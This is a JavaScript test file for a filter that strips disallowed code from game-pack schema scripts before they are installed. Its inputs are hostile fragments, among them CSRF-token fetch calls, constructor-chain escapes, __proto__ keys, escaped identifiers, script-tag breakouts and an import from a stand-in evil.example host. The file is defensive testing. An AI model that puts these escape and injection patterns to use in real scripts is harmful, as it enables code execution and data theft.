// tests/gamelogic-pack-schema-allowlist.test.js — the schema allow-list. A pack's or plugin's `schema` is
// installed as an unsandboxed TavernHelper script, so everything a schema does not need is REMOVED before
// it is judged or installed, and the rest installs. Every hostile case asserts two things: what the filter
// reported, and that the code it found is no longer in the text that would install.

import { describe, it, expect } from 'vitest';
import { filterSchemaScript, MVU_ZOD_MODULE_URL } from '../src/features/gamelogic-pack/gamelogic-pack-schema-allowlist.js';
import { judgePack, judgePackFile, schemaRemovalToastText } from '../src/features/gamelogic-pack/gamelogic-pack-core.js';
import { buildBlankArtifactMembers } from '../src/shared/artifact-skeletons.js';

const IMPORT = "import { registerMvuSchema } from '" + MVU_ZOD_MODULE_URL + "';";
const REGISTER = ['$(() => {', '  registerMvuSchema(StatDataSchema);', '});'].join('\n');
const LINE_SEPARATOR = String.fromCharCode(0x2028);
const PARAGRAPH_SEPARATOR = String.fromCharCode(0x2029);
const BACKSLASH = String.fromCharCode(92);

// What the StatusMenu builder's schema generator writes: its fixed preamble, a collection (member
// schema + catchall), a standard object, an unselected field, an array collection, a quoted key, and the
// export const root carrying the platform root, then its register step.
const BUILDER_SCHEMA = [
    IMPORT,
    '// zod and lodash are available globally as `z` and `_`',
    '',
    '/**',
    ' * IMPORTANT:',
    ' * Your MVU variable name is `stat_data`.',
    ' */',
    '',
    "const strEmpty = z.string().prefault('');",
    'const num0 = z.coerce.number().prefault(0);',
    'const boolFalse = z.coerce.boolean().prefault(false);',
    'const labeledValue = z',
    '  .tuple([',
    '    z.union([',
    '      z.string(),',
    '      z.number(),',
    '      z.boolean(),',
    '      z.null(),',
    '      z.array(z.any()),',
    '      z.object({}).passthrough(),',
    "    ]).prefault(''),",
    '    strEmpty,',
    '  ])',
    "  .prefault(['', '']);",
    "const labeledStr = z.tuple([strEmpty, strEmpty]).prefault(['', '']);",
    "const labeledNum = z.tuple([num0, strEmpty]).prefault([0, '']);",
    "const labeledBool = z.tuple([boolFalse, strEmpty]).prefault([false, '']);",
    'const worldRecordEntrySchema = z.object({}).passthrough().prefault({});',
    '',
    '// -------------------------',
    '// Cast (Collection)',
    '// -------------------------',
    'const castMemberSchema = z',
    '  .object({',
    '    Name: labeledStr,',
    '    Affinity: labeledNum,',
    "    'Is present': labeledBool,",
    "    Notes: z.any().prefault(''),",
    '    Tags: z.array(z.string().prefault(\'\')).prefault([]),',
    '  })',
    '  .catchall(labeledValue)',
    '  .prefault({});',
    '',
    'const castSchema = z.record(z.string(), castMemberSchema).prefault({});',
    '',
    'const worldSchema = z',
    '  .object({',
    '    Time: labeledStr,',
    '    Log: z.record(z.string(), worldRecordEntrySchema).prefault({}),',
    '  })',
    '  .passthrough()',
    '  .prefault({});',
    '',
    'export const StatDataSchema = z',
    '  .object({',
    '    Cast: castSchema,',
    '    World: worldSchema,',
    '    GameStarted: z.coerce.boolean().prefault(false),',
    '    GameLogicPlugin: z.record(z.string(), z.any()).prefault({}),   // platform-owned: the lock would strip it',
    '  })',
    '  .prefault({});',
    '',
    '// -------------------------',
    '// Register',
    '// -------------------------',
    REGISTER,
    '',
].join('\n');

// A small valid schema to splice hostile statements into: `extra` goes between the declarations and the
// register step.
const withStatement = (extra) => [
    IMPORT,
    "const strEmpty = z.string().prefault('');",
    'const StatDataSchema = z.looseObject({ World: strEmpty });',
    extra,
    REGISTER,
    '',
].join('\n');

const keepsUnchanged = (text) => {
    const r = filterSchemaScript(text);
    expect(r.removals).toEqual([]);
    expect(r.failure).toBe('');
    expect(r.text).toBe(text);
    return r;
};

// The filter removed something, the named code is gone from what would install, and what is left passes
// its own re-scan untouched.
const removes = (text, gone, whyPattern) => {
    const r = filterSchemaScript(text);
    expect(r.text, 'the filter refused its own output: ' + r.failure).not.toBeNull();
    expect(r.removals.length).toBeGreaterThan(0);
    for (const fragment of [].concat(gone)) expect(r.text).not.toContain(fragment);
    if (whyPattern) expect(r.removals.map((x) => x.why).join(' | ')).toMatch(whyPattern);
    expect(filterSchemaScript(r.text).removals).toEqual([]);
    return r;
};

describe('the schema allow-list keeps what the builder writes, byte for byte', () => {
    it('MUTATION TARGET — the builder generator\'s output', () => {
        expect(keepsUnchanged(BUILDER_SCHEMA).isRegistered).toBe(true);
    });

    it('the blank GameLogic Pack and blank plugin schemas mvu-helper hands out', () => {
        for (const packType of ['gamelogic', 'plugin']) {
            const built = buildBlankArtifactMembers({ packType, id: 'probe-game', name: 'Probe', description: 'd', builtWith: 'test' });
            const schemas = built.members.filter((m) => /\/schema\/[^/]+\.js$/.test(m.path));
            expect(schemas.length, packType).toBe(1);
            expect(keepsUnchanged(schemas[0].text).isRegistered, packType).toBe(true);
        }
    });

    it('inline registration, a bare register call, let/var, no semicolons and a chain on a declared name', () => {
        keepsUnchanged(IMPORT + "\nregisterMvuSchema(z.looseObject({ GameLogicPlugin: z.record(z.string(), z.any()).prefault({}) }));\n");
        keepsUnchanged([
            IMPORT,
            "let label = z.string().prefault('')",
            'var count = z.coerce.number().prefault(-1), flag = z.coerce.boolean().prefault(true)',
            "const optionalLabel = label.prefault('none')",
            'const Root = z.looseObject({ label, })'.replace('label, ', 'label: optionalLabel, count: count, flag: flag, '),
            'registerMvuSchema(Root)',
            '',
        ].join('\n'));
    });

    it('comments in any script, U+2028 inside a string, and a declaration with no value', () => {
        keepsUnchanged([
            IMPORT,
            '// 角色的好感度 — the affection meter',
            "const note = 'a' + 'b';".replace(" + 'b'", ''),
            "const sep = '" + LINE_SEPARATOR + "';",
            'let unset;',
            '/* 多行',
            '   註解 */',
            'const StatDataSchema = z.looseObject({ note: z.string().prefault(note), sep: z.string().prefault(sep) });',
            REGISTER,
        ].join('\n'));
    });
});

describe('the schema allow-list removes code, statement by statement, and keeps the rest', () => {
    it('MUTATION TARGET — a call to the page (fetch) is removed and the schema still registers', () => {
        const r = removes(withStatement("fetch('/csrf-token');"), 'fetch', /something other than registerMvuSchema/);
        expect(r.isRegistered).toBe(true);
        expect(r.text).toContain('registerMvuSchema(StatDataSchema)');
        expect(r.removals[0].line).toBe(4);
        expect(r.removals[0].what).toBe("`fetch('/csrf-token');`");
    });

    it('a declaration whose value reaches the page', () => {
        removes(withStatement("const leak = fetch('/csrf-token');"), 'fetch', /`fetch` is not declared in this file/);
        removes(withStatement('const where = window.location;'), 'window', /`window` is not declared/);
        removes(withStatement("const run = eval('1');"), 'eval', /`eval` is not declared/);
        removes(withStatement("const build = new Function('return 1');"), 'Function', /`new`/);
    });

    it('MUTATION TARGET — a z chain that leaves zod: z.constructor.constructor(…)()', () => {
        removes(withStatement("const run = z.constructor.constructor('fetch(1)')();"), 'constructor', /`\.constructor` is not on the schema allow-list/);
        removes(withStatement("const run = z['constructor'];"), 'constructor', /`z` is used as something other than/);
        removes(withStatement("const run = strEmpty['constructor'];"), 'constructor', /\[ \] lookup on `strEmpty`/);
        removes(withStatement("const run = strEmpty.constructor;"), 'constructor', /`\.constructor` is not on the schema allow-list/);
    });

    it('MUTATION TARGET — a function handed to zod, and calls that are not z members', () => {
        removes(withStatement("const s = z.string().prefault(() => fetch('/x'));"), 'fetch');
        removes(withStatement('const s = z(1);'), 'z(1)', /`z` is used as something other than/);
        removes(withStatement('const s = z.string()();'), 'z.string()()', /a call on what a call returned/);
        removes(withStatement('const s = strEmpty(1);'), 'strEmpty(1)', /`strEmpty\(…\)` is a call/);
    });

    it('MUTATION TARGET — the register wrapper runs the registration and nothing else', () => {
        const extra = removes([IMPORT, 'const S = z.looseObject({});', "$(() => { registerMvuSchema(S); fetch('/x'); });"].join('\n'),
            'fetch', /runs more than the registerMvuSchema call/);
        expect(extra.isRegistered).toBe(false);
        removes([IMPORT, "$(() => { fetch('/x'); });"].join('\n'), 'fetch', /`\$\(…\)` runs `fetch`/);
        removes([IMPORT, "$(function () { registerMvuSchema(z.looseObject({})); });"].join('\n'), 'function', /`\$\(…\)` — only/);
    });

    it('the import: one, from the mvu_zod URL, bringing registerMvuSchema alone', () => {
        removes(withStatement("import { registerMvuSchema } from 'https://evil.example/mvu_zod.js';"), 'evil.example', /a second import/);
        removes("import { registerMvuSchema } from 'https://evil.example/mvu_zod.js';\nregisterMvuSchema(z.looseObject({}));", 'evil.example', /must come from/);
        removes("import * as everything from '" + MVU_ZOD_MODULE_URL + "';", 'everything', /expected `\{`/);
        removes("import { registerMvuSchema, other } from '" + MVU_ZOD_MODULE_URL + "';", 'other', /expected `\}`/);
    });

    it('a runtime name, a reserved word or a second declaration of one name', () => {
        removes(withStatement('const z = 1;'), 'const z', /`z`, a name the script runs with/);
        removes(withStatement('const $ = 1;'), 'const $', /`\$`, a name the script runs with/);
        removes(withStatement('const if = 1;'), 'const if', /reserved word/);
        removes(withStatement('const strEmpty = 2;'), 'strEmpty = 2', /a second time/);
        removes(withStatement('export default strEmpty;'), 'default', /only export const\|let\|var/);
    });

    it('MUTATION TARGET — object keys: __proto__, an escaped key, computed, spread and shorthand', () => {
        removes(withStatement('const bad = { __proto__: strEmpty };'), '__proto__', /__proto__ sets the object's prototype/);
        removes(withStatement("const bad = { '__proto__': strEmpty };"), '__proto__', /__proto__/);
        removes(withStatement("const bad = { '__pro" + BACKSLASH + "x74o__': strEmpty };"), '__pro', /holds an escape/);
        removes(withStatement('const bad = { [strEmpty]: 1 };'), 'bad', /an object key must be/);
        removes(withStatement('const bad = { ...strEmpty };'), 'bad', /an object key must be/);
        removes(withStatement('const bad = { strEmpty };'), 'bad', /expected `:`/);
    });

    it('MUTATION TARGET — an escaped name is still the page: ' + BACKSLASH + 'u0066etch', () => {
        removes(withStatement(BACKSLASH + "u0066etch('/x');"), 'u0066etch');
    });

    it('template strings, operators and regular expressions', () => {
        removes(withStatement('const t = `${fetch(1)}`;'), 'fetch');
        removes(withStatement("const t = 'a' + fetch('/x');"), 'fetch', /unexpected `\+`/);
        removes(withStatement('const t = /x/.exec(1);'), ['/x/', 'exec'], /unexpected `\/`/);
    });

    it('a statement JavaScript continues onto the next line is removed whole', () => {
        // JavaScript reads this as ONE statement, z.string()(fetch('/x')) — so the declaration goes with it.
        const r = removes(withStatement("const s = z.string()\n(fetch('/x'));"), 'fetch', /a call on what a call returned/);
        expect(r.text).not.toContain('const s =');
    });

    it('MUTATION TARGET — whatever uses a removed name is removed too, and says why', () => {
        const r = removes([
            IMPORT,
            "const leak = fetch('/x');",
            'const Root = z.looseObject({ leak: leak });',
            'registerMvuSchema(Root);',
        ].join('\n'), ['fetch', 'leak:']);
        expect(r.removals.map((x) => x.why)).toEqual([
            '`fetch` is not declared in this file — a value may use only z.<member>(…) calls, literals and names declared above it',
            'it uses `leak`, whose own statement was removed',
            'it uses `Root`, whose own statement was removed',
        ]);
        expect(r.isRegistered).toBe(false);
    });

    it('a second registration — the first one stays', () => {
        const r = removes(withStatement('registerMvuSchema(strEmpty);'), 'registerMvuSchema(StatDataSchema)', /a second registerMvuSchema call/);
        expect(r.text).toContain('registerMvuSchema(strEmpty);');
        expect(r.isRegistered).toBe(true);
    });
});

describe('comments stay as written, but cannot carry code or close a script element', () => {
    it('MUTATION TARGET — a // comment ends at U+2028, U+2029 and a lone \\r, as JavaScript ends it', () => {
        for (const breakChar of [LINE_SEPARATOR, PARAGRAPH_SEPARATOR, '\r']) {
            const r = removes(withStatement('// a note' + breakChar + "fetch('/x');"), 'fetch');
            expect(r.text).toContain('// a note');
        }
    });

    it('MUTATION TARGET — </script, <script, <!-- and --> are removed from comments', () => {
        for (const marker of ['</script>', '<script>', '<!--', '-->', '</SCRIPT >']) {
            for (const comment of ['// x ' + marker + ' y', '/* x ' + marker + ' y */']) {
                const r = removes(withStatement(comment), marker);
                expect(r.removals[0].why).toBe('it holds an HTML script or comment marker');
                expect(r.text).toContain('mvu-helper removed a comment here');
                expect(r.isRegistered).toBe(true);
            }
        }
    });

    it('and from strings, which takes the statement holding the string', () => {
        removes(withStatement("const s = z.string().prefault('</script><script>fetch(1)</script>');"), '<script', /a string holds an HTML script or comment marker/);
    });

    it('an unclosed /* comment is removed — and a string left open at its line end takes its statement', () => {
        const r = removes(withStatement('/* never closed'), 'never closed', /never closed/);
        expect(r.text).toContain('/* mvu-helper removed a comment here */');
        removes(withStatement("const s = 'open\nconst t = 1;"), "'open", /not closed on its line/);
    });
});

describe('the filtered text is what the pack is judged and installed as', () => {
    const pack = (packType, schema) => ({
        format: '1.0', packType, id: 'probe-game', name: 'Probe', description: 'd', version: '1.0', schema,
    });
    const hostile = [IMPORT, "fetch('/csrf-token');",
        'const StatDataSchema = z.looseObject({ GameLogicPlugin: z.record(z.string(), z.any()).prefault({}) });', REGISTER].join('\n');

    it('MUTATION TARGET — judgePack: the pack installs with the code removed, and says what it removed', async () => {
        for (const packType of ['gamelogic', 'plugin']) {
            const res = await judgePack(pack(packType, hostile));
            expect(res.ok, packType + ': ' + res.errors.join(' · ')).toBe(true);
            expect(res.pack.schema).not.toContain('fetch');
            expect(res.pack.schema).toContain('registerMvuSchema(StatDataSchema)');
            expect(res.schemaRemovals.map((r) => r.line)).toEqual([2]);
            expect(res.warnings.some((w) => w.startsWith('schema line 2: removed `fetch(\'/csrf-token\');`'))).toBe(true);
        }
    });

    it('judgePackFile hands back the judged pack, never the file as it arrived', async () => {
        const res = await judgePackFile(JSON.stringify(pack('gamelogic', hostile)));
        expect(res.pack.schema).not.toContain('fetch');
    });

    it('a clean schema is the same object, and nothing is reported', async () => {
        const clean = pack('gamelogic', BUILDER_SCHEMA);
        const res = await judgePack(clean);
        expect(res.pack).toBe(clean);
        expect(res.schemaRemovals).toEqual([]);
        expect(schemaRemovalToastText(res, 'Added')).toBe('');
    });

    it('a schema left with no registration is still installed, and the warning says it registers nothing', async () => {
        const res = await judgePack(pack('gamelogic', [IMPORT, "$(() => { registerMvuSchema(z.looseObject({})); fetch('/x'); });"].join('\n')));
        expect(res.ok).toBe(true);
        expect(res.warnings).toContain('schema: with those removed, nothing in it calls registerMvuSchema, so it registers no schema');
    });

    it('the toast names the moment, the count and the lines', async () => {
        const res = await judgePack(pack('gamelogic', hostile));
        expect(schemaRemovalToastText(res, 'Added')).toBe(
            'Added — 1 part of the schema removed: not on the schema allow-list (schema line 2). The rest of the schema installs.');
    });
});
